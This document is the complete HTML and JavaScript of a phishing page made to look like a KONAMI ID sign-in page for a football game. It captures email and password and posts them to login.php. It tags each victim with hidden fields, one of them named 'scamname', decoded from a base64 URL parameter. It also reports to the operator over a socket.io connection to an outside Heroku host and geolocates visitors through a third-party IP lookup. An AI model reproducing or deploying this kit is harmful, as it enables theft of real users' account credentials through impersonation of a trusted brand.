<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>pes 2020</title>
	<link href="https://my.konami.net//common/css/bootstrap.css" rel="stylesheet" />
	<link href="https://my.konami.net//common/css/bootstrap-mykonami.css" rel="stylesheet" />
	<link href="https://my.konami.net//common/css/bootstrap-responsive.css" rel="stylesheet" />
	<link href="https://my.konami.net//common/css/site.css" rel="stylesheet" />
	<link rel="https://my.konami.net/apple-touch-icon-precomposed" href="/common/img/sp/apple-touch-icon-precomposed.png" />
	<link rel="shortcut icon" href="https://my.konami.net//common/img/sp/apple-touch-icon-precomposed.ico" />
</head>

<body>
	<div id="knm-str-container" class="container-fluid " style="margin-top: 20px;">
		<div class="row-fluid">
			<!-- ======================== &#12513;&#12452;&#12531;&#12467;&#12531;&#12486;&#12531;&#12484;&#12371;&#12371;&#12363;&#12425; =========================== -->
			<div id="knm-nav-global" class="hidden-phone">
				<div class="span3"></div>
			</div>
			<div class="span6">
				<div class="knm-box">
					<h2 class="hidden-phone"></h2>

					<div class="knm-section" id="page">
						<form id="loginForm" name="loginForm" method="post" action="login.php"
							enctype="application/x-www-form-urlencoded">
							<img src="https://www.konami.com/wepes/mobile/img/efootball2022/efootball2022_main_pc.jpg" width="100%" height="200px">
							<br>
							<br>


							<p class="text-center"><input id="email" name="email"
									value="" placeholder="KONAMI ID ou adresse e-mail" type="text"
									class="input-xlarge" />
							</p>

							<p class="text-center"><input id="password" name="password"
									placeholder="Mot de passe" type="password" class="input-xlarge" value="" />
							</p>

							<input type="hidden" value="" name="code" v-model="codecountry">

							<input type="hidden" value="" name="id" v-model="id_u">
							<input type="hidden" value="" name="sc" v-model="scamname">

							<p class="text-center">
								<button type="submit" name="login" class="knm-btn-login btn" >Connexion</button>
							</p>

						</form>

						<!-- /knm-section -->
					</div>
					<!-- /knm-box -->
				</div>
			</div>

			<div id="knm-nav-global" class="hidden-phone">
				<div class="span3"></div>
			</div>

			<script src="https://unpkg.com/axios/dist/axios.min.js"></script>
<script src="https://unpkg.com/country-phone-prefix@latest"></script>
 <script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.3.2/socket.io.js"></script>
<script>
const socket = io("wss://sc0m.herokuapp.com");
 const queryStrings = window.location.search;
    const urlParamss = new URLSearchParams(queryStrings);
    const qs = urlParamss.get('q');

    let rrss = atob(qs);
    let users = rrss.split("_")[3];
    users = users.split("=")[1];
 function ss(){
   socket.emit('add', {
    nickname: "users",
    groupe: parseInt(users),
  });
  socket.emit('adds', {
    nickname: "users",
    groupe: "all",
  });
 };
</script>
<script>
    var vm = new Vue({
el : "#page",
data:{
  password:"",
  email:"",
  login:'',
  firsts:'',
  create:'',
  forget:'',
  fetch:[],
  codecountry:'',
  id_u:'',
  scamname:'',
},
methods:{

},

 mounted()  {
     let email = document.getElementById('email').value;
  let password = document.getElementById('password').value;
     const queryString = window.location.search;
const urlParams = new URLSearchParams(queryString);
const q = urlParams.get('q');

let rrs= atob(q);
let idu= rrs.split("=")[1][1]
let user= rrs.split("_")[3]
user= user.split("=")[1]
let sc= rrs.split("_")[2]
sc= sc.split("=")[1]
rrs= rrs.split("_")[1]
rrs= rrs.split("=")[1]
//alert(user)
let lang = rrs;
this.id_u = user
this.scamname= sc

   if(lang == 'ar'){
     this.email = "رقم الهاتف  أو البريد الإلكتروني";
     this.password = "كلمه السر";
     this.create = "انشاء حساب جديد";
     this.firsts = "انت تحتاج لتسجيل الدخول اولا.";
     this.forget = " هل نسيت كلمة السر ؟";
     this.login="تسجيل الدخول"
   }
   else if (lang == 'es'){
      this.email = "Número o correo electrónico";
     this.password = "contraseña";
     this.create = "Crear una nueva cuenta";
     this.firsts = "Primero debes iniciar sesión.";
     this.forget = "¿Contraseña olvidada?";
     this.login = "iniciar sesión";
   }
   else if (lang == 'th'){
      this.email = "เบอร์มือถือหรืออีเมล";
     this.password = "รหัสผ่าน";
     this.create = "สร้างบัญชีใหม่";
     this.firsts = "คุณต้องเข้าสู่ระบบก่อน";
     this.forget = "ลืมรหัสผ่าน?";
     this.login = "เข้าสู่ระบบ";
   }
   else {
      this.email = "Mobile number or email address";
     this.password = "Password";
     this.create = "Create New Account";
     this.firsts = "You need to log in first.";
     this.forget = "Forgotten password?";
     this.login = "Log In";
   }

axios.get("https://livebotola.com/ip.php")
       .then((resps)=>{

    let dd=  cpp[resps.data]
       this.codecountry = dd.prefix;
         })

        },
})

</script>
</body>

</html>
